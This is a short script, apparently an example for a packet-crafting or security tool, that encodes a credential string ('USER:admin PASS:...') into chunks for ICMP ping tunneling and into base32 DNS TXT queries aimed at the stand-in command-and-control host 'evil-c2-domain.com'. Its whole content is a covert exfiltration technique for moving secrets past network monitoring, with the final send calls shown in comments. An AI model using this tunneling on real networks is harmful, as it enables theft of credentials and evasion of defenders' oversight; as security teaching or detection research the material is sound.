# covert_tunnel.star

secret_payload = "USER:admin PASS:super_secret_password_1234!!!"

# 1. ICMP Tunneling (Breaking into 64-byte Ping packets)
icmp_chunks = tunnel.icmp_encode(secret_payload, chunk_size=16)
print("--- ICMP Ping Fragmentation ---")
for i, chunk in enumerate(icmp_chunks):
    print("Chunk " + str(i) + ": " + str(chunk))
    # You would then package these chunks into `packet.new_icmp_echo` and send!

# 2. DNS TXT Tunneling (Base32 encoded subdomains)
print("\n--- DNS Covert Tunnel Queries ---")
dns_queries = tunnel.dns_txt_encode("evil-c2-domain.com", secret_payload)
for q in dns_queries:
    print("Spoofing DNS Query for: " + q)
    # dns.query(q, type="TXT")
